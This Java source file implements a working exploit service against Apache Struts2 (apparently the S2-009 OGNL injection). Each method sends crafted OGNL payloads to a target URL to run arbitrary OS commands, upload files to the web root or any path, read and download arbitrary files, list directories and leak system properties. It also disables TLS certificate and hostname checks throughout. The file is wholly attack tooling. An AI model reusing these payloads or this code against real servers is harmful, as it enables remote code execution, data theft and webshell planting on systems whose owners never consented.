package org.vit.service.impl;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import org.vit.model.MyURL;
import org.vit.service.ExploitService;

public class Struts2_S09_ExploitServiceImpl implements ExploitService{

	@Override
	public String getRealPath(MyURL myURL) throws Exception {
		String commandURL ="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
		
		String requestURL =myURL.getUrl()+"?"+commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		   
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
		    connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String content = "";
		buf.append("\u7269\u7406\u5730\u5740\uff1a");
		while ((content = reader.readLine()) != null) {
			buf.append(content);
		}
		reader.close();
		return buf.toString();
	}

	@Override
	public Map<String, String> getServerInfo(MyURL myURL,Map<String, String>properties) throws Exception {
		
		Map<String, String>echo=new LinkedHashMap<String,String>();
		
		for (Entry<String, String> entry:properties.entrySet()) {
			String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(@java.lang.System@getProperty(%22"+entry.getValue()+"%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
			
			String requestURL =myURL.getUrl()+"?"+ commandURL;
			URL url = new URL(requestURL);
			BufferedReader reader=null;
			
			if (myURL.getMode().equals("http")) {
				HttpURLConnection connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");
				connection.connect();
				connection.setConnectTimeout(10000);
				reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			}else {
			    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
			    
			    SSLContext sc = SSLContext.getInstance("SSL");
				sc.init(null, new TrustManager[] {
					new X509TrustManager() {
						public java.security.cert.X509Certificate[] getAcceptedIssuers() {
							return null;
						}
						public void checkClientTrusted(
							java.security.cert.X509Certificate[] certs, String authType) {
						}
						public void checkServerTrusted(
							java.security.cert.X509Certificate[] certs, String authType) {
						}
					}
				}, new java.security.SecureRandom());
				HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
				HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
					@Override
					public boolean verify(String string,SSLSession ssls) {
						return true;
					}
				});
				
			    connection.setRequestMethod("GET");
				connection.connect();
				connection.setConnectTimeout(10000);
				reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			}
			StringBuffer buf=new StringBuffer();
			String content = "";
			while ((content = reader.readLine()) != null) {
				buf.append(content);
			}
			echo.put(entry.getKey(),buf.toString());
			reader.close();
		}
		return echo;
	}

	@Override
	public String doExecutCMD(MyURL myURL, String cmd) throws Exception {
		cmd=URLDecoder.decode(cmd,"UTF-8");
		cmd=cmd.replaceAll(" ","%20");
		
		String commandURL ="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')" +
				"(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(h)(('\\43webRootzpro\\75@java.lang.Runtime@getRuntime().exec(\\43req.getParameter(%22cmd%22))')" +
				"(d))&(i)(('\\43webRootzproreader\\75new\\40java.io.DataInputStream(\\43webRootzpro.getInputStream())')" +
				"(d))&(i01)(('\\43webStr\\75new\\40byte[1024*50]')(d))&(i1)(('\\43webRootzproreader.readFully(\\43webStr)')" +
				"(d))&(i111)(('\\43webStr12\\75new\\40java.lang.String(\\43webStr).trim()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(\\43webStr12)')(d))&(i99)(('\\43xman.getWriter().close()')(d))&cmd=";
		
		String requestURL =myURL.getUrl()+"?"+commandURL+cmd;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String content = "";
		while ((content = reader.readLine()) != null) {
			buf.append(content+"\r\n");
		}
		reader.close();
		return buf.toString();
	}

	@Override
	public String doUplaod(MyURL myURL, String fileName, String content)throws Exception {
		
		String commandURL = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)" +
				"(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')" +
				"(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')" +
				"(d))&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext().getRealPath(%22\\u005c%22))')" +
				"(d))&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.lang.StringBuilder" +
				"(\\43req.getRealPath(%22\\u005c%22)).append(%22/"+fileName.trim().replace(" ", "%20") +"%22).toString())')" +
				"(d))&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))&(i4)(('\\43fos.close()')(d))"+
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(\"ok\")')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
		
		String requestURL =myURL.getUrl()+ "?" + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("POST");
			connection.setConnectTimeout(10000);
			
			connection.setDoOutput(true);
            String post = "t="+URLEncoder.encode(content,"UTF-8");
            byte[] b = post.getBytes();
            connection.getOutputStream().write(b, 0, b.length);
            connection.getOutputStream().flush();
            connection.getOutputStream().close();
			
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("POST");
			connection.setConnectTimeout(10000);
			
			connection.setDoOutput(true);
            String post = "t="+URLEncoder.encode(content,"UTF-8");
            byte[] b = post.getBytes();
            connection.getOutputStream().write(b, 0, b.length);
            connection.getOutputStream().flush();
            connection.getOutputStream().close();
			
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		return buf.toString();
	}

	@Override
	public String doGetFileSystem(MyURL myURL, String agrs) throws Exception {
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))" +
				"&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))" +
				"&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))" +
				"&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))" +
				"&(i3)(('\\43sys\\75@java.io.File@listRoots()')(d))" +
				"&(i95)(('\\43xman.getWriter().println(\\43sys"+agrs+")')(d))" +
				"&(i99)(('\\43xman.getWriter().close()')(d))";
		
		String requestURL = myURL.getUrl()+"?"+commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		   
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
		    connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		return buf.toString();
	}

	@Override
	public String doListFiles(MyURL myURL, String path, String agrs)throws Exception {
		path=URLDecoder.decode(path,"UTF-8");
		path=path.replaceAll(" ","%20");
		
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(new%20java.io.File(\\43req.getParameter(%22xpath%22)).listFiles()"+agrs+".getName())')(d))&(i99)" +
				"(('\\43xman.getWriter().close()')(d))&xpath=";
		
		String requestURL = myURL.getUrl()+"?"+commandURL+path;
		
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		return buf.toString();
	}

	@Override
	public int doGetFileNum(MyURL myURL, String path) throws Exception {
		path=URLDecoder.decode(path,"UTF-8");
		path=path.replaceAll(" ","%20");
		
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(new%20java.io.File(\\43req.getParameter(%22xpath%22)).listFiles().length)')(d))&(i99)" +
				"(('\\43xman.getWriter().close()')(d))&xpath=";
		
		String requestURL = myURL.getUrl()+"?"+commandURL+path;
		
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		return Integer.parseInt(buf.toString());
	}

	@Override
	public String doGetFileContent(MyURL myURL, String path) throws Exception {
		path=URLDecoder.decode(path,"UTF-8");
		path=path.replaceAll(" ","%20");
		
		String commandURL ="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')" +
				"(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(h)(('\\43webRootzpro\\75new%20java.io.FileInputStream(new%20java.io.File(\\43req.getParameter(%22xpath%22)))')" +
				"(d))&(i)(('\\43webRootzproreader\\75new\\40java.io.DataInputStream(\\43webRootzpro)')" +
				"(d))&(i01)(('\\43webStr\\75new\\40byte[new%20java.io.File(\\43req.getParameter(%22xpath%22)).length()]')" +
				"(d))&(i1)(('\\43webRootzproreader.readFully(\\43webStr)')" +
				"(d))&(i111)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getOutputStream().write(\\43webStr)')(d))&(i99)(('\\43xman.getOutputStream().close()')(d))&xpath=";
		
		String requestURL = myURL.getUrl()+"?"+commandURL+path;
		
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream(),"UTF-8"));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
		    
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream(),"UTF-8"));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str+"\r\n");
		}
		return buf.toString();
	}

	@Override
	public boolean doIsDirectory(MyURL myURL, String path) throws Exception {
		
		path=URLDecoder.decode(path,"UTF-8");
		path=path.replaceAll(" ","%20");
		
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(new%20java.io.File(\\43req.getParameter(%22xpath%22)).isDirectory())')(d))&(i99)" +
				"(('\\43xman.getWriter().close()')(d))&xpath=";
		
		String requestURL = myURL.getUrl()+"?"+commandURL+path;
		
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
		    
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		
		if (buf.toString().equals("false")) {
			return false;
		}else {
			return true;
		}
	}
	
	@Override
	public String doCustomUplaod(MyURL myURL, String filePath, String content)throws Exception {
		
		String commandURL = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)" +
				"(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')" +
				"(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')" +
				"(d))&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext().getRealPath(%22\\u005c%22))')" +
				"(d))&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.lang.StringBuilder" +
				"(%22"+ filePath.trim().replace(" ", "%20") +"%22).toString())')" +
				"(d))&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))&(i4)(('\\43fos.close()')(d))"+
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman.getWriter().println(\"ok\")')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
		
		String requestURL =myURL.getUrl()+ "?" + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("POST");
			connection.setConnectTimeout(10000);
			
			connection.setDoOutput(true);
            String post = "t="+URLEncoder.encode(content,"UTF-8");
            byte[] b = post.getBytes();
            connection.getOutputStream().write(b, 0, b.length);
            connection.getOutputStream().flush();
            connection.getOutputStream().close();
			
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("POST");
			connection.setConnectTimeout(10000);
			
			connection.setDoOutput(true);
            String post = "t="+URLEncoder.encode(content,"UTF-8");
            byte[] b = post.getBytes();
            connection.getOutputStream().write(b, 0, b.length);
            connection.getOutputStream().flush();
            connection.getOutputStream().close();
			
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		return buf.toString();
		
	}

	@Override
	public void doDownload(MyURL myURL, String rpath, String lpath)throws Exception {
		
		rpath=URLDecoder.decode(rpath,"UTF-8");
		rpath=rpath.replaceAll(" ","%20");
		
		String commandURL ="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')" +
				"(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(h)(('\\43webRootzpro\\75new%20java.io.FileInputStream(new%20java.io.File(\\43req.getParameter(%22xpath%22)))')" +
				"(d))&(i)(('\\43webRootzproreader\\75new\\40java.io.DataInputStream(\\43webRootzpro)')" +
				"(d))&(i01)(('\\43webStr\\75new\\40byte[new%20java.io.File(\\43req.getParameter(%22xpath%22)).length()]')" +
				"(d))&(i1)(('\\43webRootzproreader.readFully(\\43webStr)')" +
				"(d))&(i111)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getOutputStream().write(\\43webStr)')(d))&(i99)(('\\43xman.getOutputStream().close()')(d))&xpath=";
		
		String requestURL = myURL.getUrl()+"?"+commandURL+rpath;
		
		URL url = new URL(requestURL);
		InputStream inputStream=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			inputStream=connection.getInputStream();
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
		    
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			inputStream=connection.getInputStream();
		}
		
		FileOutputStream fos=new FileOutputStream(new File(lpath));
		
		int m=0;
		while ((m=inputStream.read())!=-1) {
			fos.write(m);
		}
		fos.flush();
		fos.close();
		
	}

}
